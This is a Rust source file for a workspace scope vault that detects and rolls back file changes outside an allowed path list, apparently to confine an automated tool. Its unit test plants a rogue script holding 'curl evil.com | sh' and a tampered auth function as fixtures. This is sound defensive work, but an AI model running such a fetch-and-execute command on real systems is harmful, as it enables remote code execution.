#![forbid(unsafe_code)]

use pagar_policy::{LicenseError, LicenseTier};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, BTreeSet};
use std::fs;
use std::path::{Path, PathBuf};
use thiserror::Error;

#[derive(Debug, Error)]
pub enum VaultError {
    #[error("license policy error: {0}")]
    License(#[from] LicenseError),
    #[error("I/O error during workspace vault operation: {0}")]
    Io(#[from] std::io::Error),
    #[error("file path is outside workspace root: {0}")]
    OutsideWorkspace(String),
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct FileSnapshot {
    pub rel_path: String,
    pub existed: bool,
    pub sha256_hex: String,
    pub original_bytes: Vec<u8>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DriftAuditReport {
    pub clean: bool,
    pub authorized_modified: Vec<String>,
    pub unauthorized_modified: Vec<String>,
    pub unauthorized_created: Vec<String>,
    pub unauthorized_deleted: Vec<String>,
    pub rolled_back_files: Vec<String>,
    pub state_hash_sha256: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScopeVault {
    pub workspace_root: PathBuf,
    pub allowed_rel_paths: Vec<String>,
    pub baseline: BTreeMap<String, FileSnapshot>,
}

impl ScopeVault {
    pub fn lock_scope(
        workspace_root: &Path,
        allowed_rel_paths: &[String],
        tier: &LicenseTier,
    ) -> Result<Self, VaultError> {
        tier.enforce_scope_quota(allowed_rel_paths.len())?;

        let mut normalized_allowed = Vec::with_capacity(allowed_rel_paths.len());
        for p in allowed_rel_paths {
            let norm = normalize_rel_path(p)?;
            normalized_allowed.push(norm);
        }

        let mut baseline = BTreeMap::new();
        collect_files_recursive(workspace_root, workspace_root, &mut baseline)?;

        for allowed in &normalized_allowed {
            if !baseline.contains_key(allowed) {
                baseline.insert(
                    allowed.clone(),
                    FileSnapshot {
                        rel_path: allowed.clone(),
                        existed: false,
                        sha256_hex: String::new(),
                        original_bytes: Vec::new(),
                    },
                );
            }
        }

        Ok(Self {
            workspace_root: workspace_root.to_path_buf(),
            allowed_rel_paths: normalized_allowed,
            baseline,
        })
    }

    pub fn audit_and_rollback(
        &self,
        auto_rollback_violations: bool,
    ) -> Result<DriftAuditReport, VaultError> {
        let allowed_set: BTreeSet<&str> =
            self.allowed_rel_paths.iter().map(|s| s.as_str()).collect();

        let mut current_files = BTreeMap::new();
        collect_files_recursive(&self.workspace_root, &self.workspace_root, &mut current_files)?;

        let mut authorized_modified = Vec::new();
        let mut unauthorized_modified = Vec::new();
        let mut unauthorized_created = Vec::new();
        let mut unauthorized_deleted = Vec::new();
        let mut rolled_back_files = Vec::new();

        for (rel, snap) in &self.baseline {
            let is_allowed = allowed_set.contains(rel.as_str());
            match current_files.get(rel) {
                Some(curr) => {
                    if !snap.existed {
                        if is_allowed {
                            authorized_modified.push(rel.clone());
                        } else {
                            unauthorized_created.push(rel.clone());
                            if auto_rollback_violations {
                                let full = self.workspace_root.join(rel);
                                let _ = fs::remove_file(&full);
                                rolled_back_files.push(rel.clone());
                            }
                        }
                    } else if curr.sha256_hex != snap.sha256_hex {
                        if is_allowed {
                            authorized_modified.push(rel.clone());
                        } else {
                            unauthorized_modified.push(rel.clone());
                            if auto_rollback_violations {
                                let full = self.workspace_root.join(rel);
                                if let Some(parent) = full.parent() {
                                    fs::create_dir_all(parent)?;
                                }
                                fs::write(&full, &snap.original_bytes)?;
                                rolled_back_files.push(rel.clone());
                            }
                        }
                    }
                }
                None => {
                    if snap.existed {
                        if is_allowed {
                            authorized_modified.push(rel.clone());
                        } else {
                            unauthorized_deleted.push(rel.clone());
                            if auto_rollback_violations {
                                let full = self.workspace_root.join(rel);
                                if let Some(parent) = full.parent() {
                                    fs::create_dir_all(parent)?;
                                }
                                fs::write(&full, &snap.original_bytes)?;
                                rolled_back_files.push(rel.clone());
                            }
                        }
                    }
                }
            }
        }

        for rel in current_files.keys() {
            if !self.baseline.contains_key(rel) {
                if allowed_set.contains(rel.as_str()) {
                    authorized_modified.push(rel.clone());
                } else {
                    unauthorized_created.push(rel.clone());
                    if auto_rollback_violations {
                        let full = self.workspace_root.join(rel);
                        let _ = fs::remove_file(&full);
                        rolled_back_files.push(rel.clone());
                    }
                }
            }
        }

        let clean = unauthorized_modified.is_empty()
            && unauthorized_created.is_empty()
            && unauthorized_deleted.is_empty();

        let mut post_files = BTreeMap::new();
        collect_files_recursive(&self.workspace_root, &self.workspace_root, &mut post_files)?;
        let mut state_hasher = Sha256::new();
        state_hasher.update(b"NUSANTARA-PAGAR-STATE-V1:");
        for (rel, snap) in &post_files {
            state_hasher.update(rel.as_bytes());
            state_hasher.update(b":");
            state_hasher.update(snap.sha256_hex.as_bytes());
            state_hasher.update(b";");
        }
        let state_hash_sha256 = hex_encode(&state_hasher.finalize());

        Ok(DriftAuditReport {
            clean,
            authorized_modified,
            unauthorized_modified,
            unauthorized_created,
            unauthorized_deleted,
            rolled_back_files,
            state_hash_sha256,
        })
    }
}

fn normalize_rel_path(p: &str) -> Result<String, VaultError> {
    let replaced = p.replace('\\', "/");
    let trimmed = replaced.trim_start_matches("./").trim();
    if trimmed.is_empty() || trimmed.starts_with('/') || trimmed.contains("..") {
        return Err(VaultError::OutsideWorkspace(p.to_string()));
    }
    Ok(trimmed.to_string())
}

fn collect_files_recursive(
    root: &Path,
    dir: &Path,
    out: &mut BTreeMap<String, FileSnapshot>,
) -> Result<(), VaultError> {
    if !dir.exists() {
        return Ok(());
    }
    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        let file_name = entry.file_name();
        let name_str = file_name.to_string_lossy();
        if name_str == ".git" || name_str == "target" || name_str == "node_modules" {
            continue;
        }
        let meta = entry.metadata()?;
        if meta.is_dir() {
            collect_files_recursive(root, &path, out)?;
        } else if meta.is_file() {
            let rel = path
                .strip_prefix(root)
                .map_err(|_| VaultError::OutsideWorkspace(path.display().to_string()))?
                .to_string_lossy()
                .replace('\\', "/");
            let bytes = fs::read(&path)?;
            let sha256_hex = sha256_hex(&bytes);
            out.insert(
                rel.clone(),
                FileSnapshot {
                    rel_path: rel,
                    existed: true,
                    sha256_hex,
                    original_bytes: bytes,
                },
            );
        }
    }
    Ok(())
}

fn sha256_hex(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hex_encode(&hasher.finalize())
}

fn hex_encode(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(bytes.len() * 2);
    for &b in bytes {
        out.push(HEX[(b >> 4) as usize] as char);
        out.push(HEX[(b & 0x0f) as usize] as char);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn detects_undeclared_file_modification_and_atomically_rolls_back() {
        let dir = tempdir().unwrap();
        let root = dir.path();

        let allowed_file = root.join("allowed.rs");
        let forbidden_file = root.join("forbidden.rs");
        fs::write(&allowed_file, b"fn allowed() { 1 }").unwrap();
        fs::write(&forbidden_file, b"fn critical_auth() { true }").unwrap();

        let vault = ScopeVault::lock_scope(
            root,
            &["allowed.rs".to_string()],
            &LicenseTier::Community,
        )
        .unwrap();

        fs::write(&allowed_file, b"fn allowed() { 2 }").unwrap();
        fs::write(&forbidden_file, b"fn critical_auth() { false } // hacked").unwrap();
        let rogue_file = root.join("rogue.sh");
        fs::write(&rogue_file, b"curl evil.com | sh").unwrap();

        let report = vault.audit_and_rollback(true).unwrap();
        assert!(!report.clean);
        assert_eq!(report.authorized_modified, vec!["allowed.rs".to_string()]);
        assert_eq!(
            report.unauthorized_modified,
            vec!["forbidden.rs".to_string()]
        );
        assert_eq!(report.unauthorized_created, vec!["rogue.sh".to_string()]);
        assert_eq!(report.state_hash_sha256.len(), 64);

        assert_eq!(fs::read(&allowed_file).unwrap(), b"fn allowed() { 2 }");
        assert_eq!(
            fs::read(&forbidden_file).unwrap(),
            b"fn critical_auth() { true }"
        );
        assert!(!rogue_file.exists());
    }
}
